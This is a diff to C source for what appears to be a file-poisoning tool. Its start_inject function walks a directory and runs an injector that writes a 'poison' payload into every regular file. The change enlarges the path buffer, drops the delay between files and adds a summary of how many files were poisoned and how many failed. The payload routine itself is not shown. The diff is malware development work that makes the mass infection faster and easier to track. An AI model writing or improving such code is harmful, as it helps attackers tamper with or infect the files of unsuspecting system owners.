@@ -17,10 +17,12 @@ void banner(){
 
 
 void start_inject(char *path, char *poison){
-    char full_path[20];
+    char full_path[50];
     DIR *directory;
     struct dirent *dir;
     struct stat buffer;
+    int poison_success = 0;
+    int poison_failed = 0;
     directory = opendir(path);
     if (directory) {
         fprintf(stdout, AC_YELLOW "[*] start injecting poison to directory: '%s'\n" AC_NORMAL, path);
@@ -28,12 +30,17 @@ void start_inject(char *path, char *poison){
         {
              if (dir->d_type == DT_REG )
             {
-                snprintf(full_path, 20, "%s/%s", path, dir->d_name);
-                injector(full_path, poison);
-                sleep(1);
+                snprintf(full_path, 50, "%s/%s", path, dir->d_name);
+                if(injector(full_path, poison) == 0){
+                    poison_success++;
+                    continue;
+                }
+                poison_failed++;
+                //sleep(1);
             }
         }
         closedir(directory);
+        fprintf(stdout, AC_GREEN "[*] Summary:\n[+] Total files scanned: %d\n[+] poison success: %d\n[+] poison failed: %d\n" AC_NORMAL, poison_success+poison_failed, poison_success, poison_failed);
         return;
     } 
     int ret_code = stat(path, &buffer) == 0 ? true : false;
